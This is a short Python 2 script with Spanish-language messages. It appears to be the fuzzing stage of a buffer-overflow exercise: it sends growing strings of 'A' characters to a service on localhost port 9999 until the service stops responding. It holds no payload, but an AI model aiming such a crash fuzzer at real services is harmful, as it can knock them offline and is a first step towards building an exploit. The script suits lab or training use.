#!/usr/bin/python
import sys, socket

direccion = '127.0.0.1'
puerto = 9999
buffer = ['A']
contador = 100

while len(buffer) <= 10:
	buffer.append('A'*contador)
	contador = contador + 100
try:
	for cadena in buffer:
		print '[+] Enviando %s bytes...' % len(cadena)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((direccion, puerto))
		s.send(cadena + '\r\n')
		s.recv(1024)
		print '[+] Listo'
except:
 	print '[!] No se puede conectar al programa. Puede que lo hayas crasheado.'
 	sys.exit(0)
finally:
	s.close()